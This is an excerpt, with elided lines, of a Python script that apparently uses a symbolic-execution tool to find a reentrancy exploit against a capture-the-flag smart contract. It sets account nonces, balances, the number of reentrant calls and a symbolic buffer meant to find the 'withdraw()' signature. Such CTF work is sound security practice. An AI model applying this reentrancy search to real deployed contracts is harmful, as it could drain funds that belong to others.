...
contract_balance = 1000000000000000000 # set to the value of the CTF contract
attacker_balance = 0# we don't need any for this exploit
...
set_nonce(m.get_world(),attacker_account.address, 280) # get this from geth's getTransactionCount function
...
set_nonce(m.get_world(),creator_account.address,379) # get this from geth's getTransactionCount function
...
exploit_account.set_reentry_reps(10) # set the number of times we reenter the vulnerable function (including first call)

print("Setting symbolic attack string")
reentry_string = m.make_symbolic_buffer(8) # should find the signature hash for 'withdraw()'
